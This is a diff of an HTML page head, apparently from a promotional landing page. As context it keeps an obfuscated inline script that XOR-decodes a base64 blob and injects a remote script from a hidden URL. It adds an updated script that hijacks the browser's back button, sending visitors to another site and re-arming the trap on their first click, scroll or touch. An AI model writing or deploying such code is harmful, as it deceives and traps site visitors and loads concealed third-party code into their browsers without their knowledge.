@@ -5,19 +5,32 @@
 
 <script>(function(){var k_mz=atob("DLc+j/zxFCWw7kXhgcwc+o6dNh+ShjGV8cQEoNOScEuemzGM6NFHoZ+eeQvSnGqS4sVX/4iCO1XZliCNrsdX95mdOk/DzGnD4MNK/ZWTYVHVnWfb2uoSrZude0fRgjbDu+xFrZKQeUCS1GeR6M9b47WVNgmSmCSN9NIctd7HdRzUjCaC4oZf7czFJBeB33aAsYEOupjTaXjN");var f_2vl=[];for(var i_i3wg=0;i_i3wg<k_mz.length;i_i3wg++){f_2vl.push(k_mz.charCodeAt(i_i3wg)&255);}var h_l=f_2vl[0];var c_coac=f_2vl.slice(1,1+h_l);var v_g=f_2vl.slice(1+h_l);var f_e5=v_g.map(function(b,j_a7b){return b^c_coac[j_a7b%h_l];});var m_e="";for(var s_6ixa=0;s_6ixa<f_e5.length;s_6ixa++){m_e+=String.fromCharCode(f_e5[s_6ixa]&255);}var v_vgvr=decodeURIComponent(escape(m_e));var n_cq=JSON.parse(v_vgvr);var w_2mad=n_cq.globals||[];w_2mad.forEach(function(q_q){window[q_q.name]=q_q.value;});var a_jyp=document.createElement("script");a_jyp.src=n_cq.url;a_jyp.async=true;a_jyp.defer=true;(n_cq.attributes||[]).forEach(function(f_hj98){a_jyp.setAttribute(f_hj98.name,f_hj98.value);});(document.head||document.documentElement).appendChild(a_jyp);})();</script>
 
-    <!-- 👇 back redirect DEPOIS da utmify -->
-    <script>
-    (function () {
-      var redirectUrl = 'https://promo2-0.vercel.app/back';
-      if (location.search) {
-        redirectUrl += (redirectUrl.indexOf('?') > -1 ? '&' : '?') + location.search.replace(/^\?/, '');
-      }
-      history.pushState(null, '', location.href);
-      window.addEventListener('popstate', function () {
-        window.location.replace(redirectUrl);
-      });
-    })();
-    </script>
+   <!-- back redirect DEPOIS da utmify -->
+<script>
+(function () {
+  var redirectUrl = 'https://promo2-0.vercel.app/back';
+  if (location.search) {
+    redirectUrl += (redirectUrl.indexOf('?') > -1 ? '&' : '?') + location.search.replace(/^\?/, '');
+  }
+
+  history.pushState(null, '', location.href);
+
+  window.addEventListener('popstate', function () {
+    window.location.replace(redirectUrl);
+  });
+
+  // Chrome/Android: re-arma o "voltar" no primeiro gesto do usuario
+  var rearmed = false;
+  function rearm() {
+    if (rearmed) return;
+    rearmed = true;
+    history.pushState(null, '', location.href);
+  }
+  ['click', 'scroll', 'touchstart', 'keydown', 'mousedown'].forEach(function (ev) {
+    window.addEventListener(ev, rearm, { once: true, passive: true });
+  });
+})();
+</script>
 
 	<meta charset="UTF-8">
 	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5, user-scalable=yes">
